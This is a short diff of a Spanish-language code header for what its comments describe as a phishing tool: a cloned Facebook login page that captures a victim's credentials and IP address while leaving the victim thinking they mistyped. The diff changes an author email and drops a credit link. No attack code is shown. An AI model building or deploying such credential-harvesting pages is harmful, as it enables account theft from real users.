@@ -9,12 +9,9 @@
      * Si todo ha salido bien, el usuario víctima pensará que se equivocó al introducir el usuario o la contraseña.
      * 
      * @category Cybersecurity
-     * @author David Nuño García <davidnunogarcia@gmail.com>
+     * @author David Nuño García <hola@davidnuno.es>
      * @version 1.0
      * @since 1.0
-     * 
-     * Gracias a Mike Woodward (@citizenwoodward) por la codificación de la página clon del login de facebook
-     * @see https://codepen.io/citizenwoodward/pen/emBRXW
      */
 
     // Obtenemos la dirección IP de la víctima
